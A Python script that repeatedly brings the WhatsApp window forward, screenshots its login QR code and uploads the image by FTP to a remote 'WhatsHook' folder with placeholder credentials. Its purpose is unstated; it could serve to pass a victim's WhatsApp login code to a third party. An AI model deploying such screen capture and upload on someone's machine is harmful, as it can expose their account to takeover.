import sys
import pyscreenshot as ImageGrab
import ftplib
import pyautogui
import sys
import shutil
from PIL import Image
from time import sleep
import win32gui
import re
from pixelmatch.contrib.PIL import pixelmatch

while True:
    #reactive qrcode
    class WindowMgr:
        """Encapsulates some calls to the winapi for window management"""

        def __init__ (self):
            """Constructor"""
            self._handle = None

        def find_window(self, class_name, window_name=None):
            """find a window by its class_name"""
            self._handle = win32gui.FindWindow(class_name, window_name)

        def _window_enum_callback(self, hwnd, wildcard):
            """Pass to win32gui.EnumWindows() to check all the opened windows"""
            if re.match(wildcard, str(win32gui.GetWindowText(hwnd))) is not None:
                self._handle = hwnd

        def find_window_wildcard(self, wildcard):
            """find a window whose title matches the wildcard regex"""
            self._handle = None
            win32gui.EnumWindows(self._window_enum_callback, wildcard)

        def set_foreground(self):
            """put the window in the foreground"""
            win32gui.SetForegroundWindow(self._handle)


    w = WindowMgr()
    w.find_window_wildcard("WhatsApp")
    w.set_foreground()
    pyautogui.click(1245, 360)
    sleep(1)

    # part of the screen
    ims=ImageGrab.grab(bbox=(1136,225,1137,226))
    ims.save("imgs.png")
    im=ImageGrab.grab(bbox=(1136,225,1400,488))
    im.save("img.png")

    #compare if qrcode
    qrcode = True
    img_a = Image.open("imgs.png")
    img_b = Image.open("qrnorm.png")
    mismatch = pixelmatch(img_a, img_b, fail_fast=True, includeAA=True)
    if mismatch == 1:
        shutil.copyfile("qrcodeexample.png", "img.png")
        img_a = Image.open("imgs.png")
        img_b = Image.open("qrreload.png")
        mismatch = pixelmatch(img_a, img_b, fail_fast=True, includeAA=True)
        if mismatch == 1:
            shutil.copyfile("qrcodeexample.png", "img.png")
            img_a = Image.open("imgs.png")
            img_b = Image.open("white.png")
            mismatch = pixelmatch(img_a, img_b, fail_fast=True, includeAA=True)
            if mismatch == 1:
                shutil.copyfile("qrcodeexample.png", "img.png")
                img_a = Image.open("imgs.png")
                img_b = Image.open("exn2.png")
                mismatch = pixelmatch(img_a, img_b, fail_fast=True, includeAA=True)
                if mismatch == 1:
                    shutil.copyfile("qrcodeexample.png", "img.png")
                    img_a = Image.open("imgs.png")
                    img_b = Image.open("exn3.png")
                    mismatch = pixelmatch(img_a, img_b, fail_fast=True, includeAA=True)
                    if mismatch == 1:
                        qrcode = False
        
        
    # to file 
    session = ftplib.FTP('SERVER DOMAIN','LOGINNAME','LOGINPASSWORD')
    if qrcode :
        file = open("img.png",'rb')
        session.cwd("WhatsHook")
        session.storbinary('STOR img.png', file)
        file.close()
        session.quit()
    if qrcode == False:
        file = open("imgnotavaliable.png",'rb')
        session.cwd("WhatsHook")
        session.storbinary('STOR img.png', file)
        file.close()
        session.quit()
        sleep(1)
        sys.exit()

